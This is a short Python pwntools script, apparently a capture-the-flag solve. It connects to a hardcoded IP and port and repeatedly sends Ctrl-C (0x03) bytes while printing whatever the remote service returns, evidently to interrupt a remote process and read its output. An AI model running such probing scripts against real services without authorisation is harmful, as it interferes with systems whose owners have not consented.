from pwn import *

p = remote("34.170.146.252", 21066)

while True:
    try:
        d = p.recv(1, timeout=3)
        p.send(b"\x03")

        if d:
            print(d.decode(), end="", flush=True)
        else:
            p.send(b"a")

    except EOFError:
        print("\nEOF")
        break
